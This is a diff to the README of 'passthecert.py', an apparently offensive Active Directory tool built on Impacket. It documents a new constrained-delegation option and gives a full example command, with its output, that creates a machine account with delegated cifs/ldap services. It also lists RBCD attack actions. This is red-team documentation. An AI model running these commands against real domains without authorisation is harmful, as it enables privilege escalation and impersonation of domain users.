@@ -49,7 +49,8 @@ Manage Computer:
                         Name of computer to add.If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.
   -computer-pass password
                         Password to set to computerIf omitted, a random [A-Za-z0-9]{32} will be used.
-
+  -delegated-services PROTO/FQDN,...
+                        Constrained delegated services to configure in the new computer object (no space in the list).
 RBCD attack:
   -delegate-to DELEGATE_TO
                         Target computer account the attacker has at least WriteProperty to
@@ -70,11 +71,17 @@ Actions
   * `del_computer`: Delete a computer from the domain
   * `modify_computer`: Modify the password of the computer
 
+
+* Contrained delegation attack
+  * `add_computer -delegated-services`: Add a computer configured with contrained delegated services store in `msDS-AllowedToDelegateTo` new computer's attributes.
+
+
 * RBCD attack
   * `read_rbcd`: Read `msDS-AllowedToActOnBehalfOfOtherIdentity` and resolve SIDs to `sAMaccountnames`
   * `write_rbcd`: Write new SIDs to `the msDS-AllowedToActOnBehalfOfOtherIdentity`
   * `remove_rbcd`: Remove specific entries
   * `flush_rbcd`: Flush all entries
+
 
 * Misc
   * `whoami`: Return the user represented by the certificate
@@ -100,6 +107,16 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Successfully added machine account OFFSECMACHINE$ with password SheSellsSeaShellsOnTheSeaShore.
 ```
 
+Create a computer via LDAPS with custom name and with constrained delegated services configured (cifs and ldap over SRV-MAIL.domain.local):
+
+```console
+$ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -computer-name OFFSECMACHINE$ -delegated-services cifs/SRV-MAIL.domain.local,ldap/SRV-MAIL.domain.local
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
+
+[+] Adding contrained delegations to the new computer object: cifs/SRV-MAIL.domain.local,ldap/SRV-MAIL.domain.local
+[*] Successfully added machine account OFFSECMACHINE$ with password kUwdbHeuTw64QvaLzUYHrjfgE7hrRigS
+```
+
 Add a delegation right via StartTLS on port 389:
 
 ```console
@@ -119,4 +136,3 @@ Credits
 - [JaGoTu (@jagotu)](https://twitter.com/jagotu) for [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)
 - [Remi Gascou (@podalirius_)](https://twitter.com/podalirius_) and [Charlie Bromberg (@_nwodtuhs)](https://twitter.com/_nwodtuhs) for [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py)
 * [Impacket](https://github.com/SecureAuthCorp/impacket) by [SecureAuth](https://www.secureauth.com/)
-
